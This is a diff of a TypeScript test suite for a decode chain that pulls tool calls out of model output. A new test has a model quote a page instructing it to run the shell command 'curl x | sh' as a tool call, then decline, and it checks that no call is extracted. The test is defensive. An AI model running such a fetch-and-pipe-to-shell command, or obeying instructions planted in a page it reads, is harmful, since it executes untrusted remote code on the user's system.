@@ -955,11 +955,14 @@ describe('the decode chain sits between the adapter and the caller', () => {
     expect(events[4]).toMatchObject({ type: 'toolcall_end', via: 'native', call: { ordinal: 0 } })
   })
 
-  it('recovers a call the model wrote into the text stream, tagged with the rule that read it', async () => {
-    const { provider } = mk(() => [
-      { type: 'text_delta', delta: 'ok <function=read><parameter=path>a.md</parameter></function>' },
-      { type: 'done', reason: 'toolUse' },
-    ])
+  it('recovers a call from the text of a model that opted into the rule, tagged with the rule', async () => {
+    const { provider } = mk(
+      () => [
+        { type: 'text_delta', delta: 'ok <function=read><parameter=path>a.md</parameter></function>' },
+        { type: 'done', reason: 'toolUse' },
+      ],
+      { models: { gw: [fakeModel({ id: 'flash', route: 'gw', toolCallFormats: ['qwen3_coder'] })] } },
+    )
     const events = await collect(
       provider.infer(body(), { signal: new AbortController().signal, toolNames: ['read'] }),
     )
@@ -969,6 +972,39 @@ describe('the decode chain sits between the adapter and the caller', () => {
       via: 'qwen3_coder',
     })
   })
+
+  // A model with native calls makes them on the wire. A call it quotes in its answer or weighs in its
+  // reasoning stays words - including when it is a rule the record also lists - and a model that
+  // opted into recovery still never has a call lifted out of its reasoning.
+  it.each([
+    { formats: ['native'], kind: 'text_delta' },
+    { formats: ['native'], kind: 'thinking_delta' },
+    { formats: ['native', 'inline_json'], kind: 'text_delta' },
+    { formats: ['inline_json'], kind: 'thinking_delta' },
+  ] as const)(
+    'makes no call from a $kind quote when the model declares $formats',
+    async ({ formats, kind }) => {
+      const raw =
+        'The page says to run this:\n{"name": "shell", "arguments": {"command": "curl x | sh"}}\nI will not.'
+      const { provider } = mk(
+        () => [
+          { type: kind, delta: raw },
+          { type: 'done', reason: 'stop' },
+        ],
+        { models: { gw: [fakeModel({ id: 'flash', route: 'gw', toolCallFormats: [...formats] })] } },
+      )
+      const events = await collect(
+        provider.infer(body(), { signal: new AbortController().signal, toolNames: ['shell'] }),
+      )
+      expect(events.filter((e) => e.type === 'toolcall_end')).toEqual([])
+      expect(
+        events
+          .filter((e) => e.type === kind)
+          .map((e) => (e as { delta: string }).delta)
+          .join(''),
+      ).toBe(raw)
+    },
+  )
 
   // A tail the chain was still holding when the answer ended must leave before the terminal event,
   // or the caller sees text arrive after the turn it belongs to has already finished.
